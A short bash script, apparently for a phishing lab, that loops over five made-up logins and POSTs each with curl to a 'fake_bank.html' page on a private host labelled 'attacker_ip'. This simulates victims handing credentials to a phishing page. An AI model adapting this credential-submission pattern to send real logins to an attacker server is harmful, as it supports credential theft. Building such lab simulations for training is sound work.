#!/bin/bash

# List of funny username and password combinations
creds=(
  "username=victim1&password=password123"
  "username=batman&password=robinRocks!"
  "username=ironman&password=jarvis123"
  "username=spiderman&password=web123!"
  "username=hackerMan&password=keyboardWarrior"
)
attacker_ip="172.29.0.2"
# Loop through the credentials and submit each to the fake bank page
for cred in "${creds[@]}"; do
  echo "Submitting credentials: $cred"
  curl -d "$cred" -X POST http://$attacker_ip:8080/fake_bank.html
  sleep 2  # Sleep for 2 seconds between each request
done

echo "All credentials sent."
